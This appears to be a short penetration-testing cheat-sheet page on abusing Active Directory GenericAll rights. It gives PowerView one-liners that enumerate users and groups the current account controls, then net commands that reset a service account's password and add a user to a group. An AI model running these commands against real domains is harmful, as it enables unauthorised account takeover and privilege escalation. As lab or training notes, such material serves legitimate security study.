# GenericAll

## Users

{% code overflow="wrap" %}
```powershell
# Enumerating user access rights
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (40) (1).png" alt=""><figcaption><p>GenericAll on a Service Account</p></figcaption></figure>

```powershell
# GenericAll on an account allows for a password reset
# Change password of TestService1
net user testservice1 h4x /domain
```

## Groups

{% code overflow="wrap" %}
```powershell
# Enumerating group access rights
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (1) (4).png" alt=""><figcaption><p>GenericAll on a Group</p></figcaption></figure>

```powershell
# Add the user offsec to TestGroup
net group testgroup offsec /add /domain
```
